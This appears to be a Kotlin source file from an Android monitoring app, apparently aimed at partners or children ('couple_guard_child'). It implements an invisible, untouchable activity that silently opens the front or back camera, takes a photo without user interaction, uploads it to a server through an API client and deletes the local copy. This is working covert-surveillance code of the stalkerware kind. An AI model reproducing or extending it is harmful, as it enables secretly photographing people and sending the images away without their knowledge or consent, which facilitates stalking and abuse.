package com.example.couple_guard_child.services

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import com.example.couple_guard_child.utils.ApiClient
import java.io.File
import java.io.FileOutputStream

class CameraTransparentActivity : Activity() {
    companion object {
        private const val TAG = "CameraTransparentActivity"
        private const val EXTRA_USE_FRONT = "use_front_camera"
        
        fun start(context: Context, useFrontCamera: Boolean) {
            val intent = Intent(context, CameraTransparentActivity::class.java)
            intent.putExtra(EXTRA_USE_FRONT, useFrontCamera)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
            context.startActivity(intent)
        }
    }

    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private val handler = Handler(Looper.getMainLooper())
    private var useFrontCamera: Boolean = true

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Make activity transparent and invisible
        window.addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)
        window.addFlags(WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE)
        
        useFrontCamera = intent.getBooleanExtra(EXTRA_USE_FRONT, true)
        
        Log.d(TAG, "========================================")
        Log.d(TAG, "📸 TRANSPARENT CAMERA ACTIVITY")
        Log.d(TAG, "Use front camera: $useFrontCamera")
        
        // Small delay to ensure activity is ready
        handler.postDelayed({
            capturePhoto()
        }, 300)
    }

    private fun capturePhoto() {
        try {
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            
            val cameraId = findCamera(useFrontCamera)
            if (cameraId == null) {
                Log.e(TAG, "❌ Camera not found")
                finish()
                return
            }
            
            Log.d(TAG, "Camera ID: $cameraId")

            if (checkSelfPermission(android.Manifest.permission.CAMERA) 
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "❌ No camera permission")
                finish()
                return
            }

            imageReader = ImageReader.newInstance(1280, 720, android.graphics.ImageFormat.JPEG, 2)
            
            imageReader?.setOnImageAvailableListener({ reader ->
                Log.d(TAG, "📸 Image available")
                
                val image = reader.acquireLatestImage()
                if (image != null) {
                    saveAndSendImage(image)
                    image.close()
                }
                
                closeCamera()
                finish()
                
            }, handler)

            Log.d(TAG, "Opening camera...")
            cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    Log.d(TAG, "✅ Camera opened")
                    cameraDevice = camera
                    takePicture()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.w(TAG, "⚠️ Camera disconnected")
                    closeCamera()
                    finish()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "❌ Camera error: $error")
                    closeCamera()
                    finish()
                }
            }, handler)

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to capture photo", e)
            finish()
        }
    }

    private fun findCamera(useFront: Boolean): String? {
        try {
            val cameraIds = cameraManager?.cameraIdList ?: return null
            
            for (id in cameraIds) {
                val characteristics = cameraManager?.getCameraCharacteristics(id)
                val facing = characteristics?.get(CameraCharacteristics.LENS_FACING)
                
                val targetFacing = if (useFront) {
                    CameraCharacteristics.LENS_FACING_FRONT
                } else {
                    CameraCharacteristics.LENS_FACING_BACK
                }
                
                if (facing == targetFacing) {
                    return id
                }
            }
            
            return cameraIds.firstOrNull()
        } catch (e: Exception) {
            Log.e(TAG, "Error finding camera", e)
            return null
        }
    }

    private fun takePicture() {
        try {
            val captureRequest = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureRequest?.addTarget(imageReader!!.surface)
            
            captureRequest?.set(
                CaptureRequest.CONTROL_AF_MODE,
                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE
            )

            cameraDevice?.createCaptureSession(
                listOf(imageReader!!.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        try {
                            session.capture(captureRequest!!.build(), null, handler)
                            Log.d(TAG, "✅ Capture triggered")
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to capture", e)
                            finish()
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "❌ Configure failed")
                        finish()
                    }
                },
                handler
            )

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to take picture", e)
            finish()
        }
    }

    private fun saveAndSendImage(image: android.media.Image) {
        try {
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)

            val file = File(cacheDir, "capture_${System.currentTimeMillis()}.jpg")
            FileOutputStream(file).use { output ->
                output.write(bytes)
            }

            Log.d(TAG, "✅ Image saved: ${file.path}")

            val cameraType = if (useFrontCamera) "front" else "back"
            
            Thread {
                try {
                    val success = ApiClient.uploadCapturedPhoto(
                        applicationContext, 
                        file,
                        cameraType
                    )
                    
                    if (success) {
                        Log.d(TAG, "✅ Photo uploaded")
                    }
                    
                    file.delete()
                    
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to upload", e)
                }
            }.start()

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to save image", e)
        }
    }

    private fun closeCamera() {
        try {
            cameraDevice?.close()
            cameraDevice = null
            imageReader?.close()
            imageReader = null
        } catch (e: Exception) {
            Log.e(TAG, "Error closing camera", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        closeCamera()
        Log.d(TAG, "========================================")
    }
}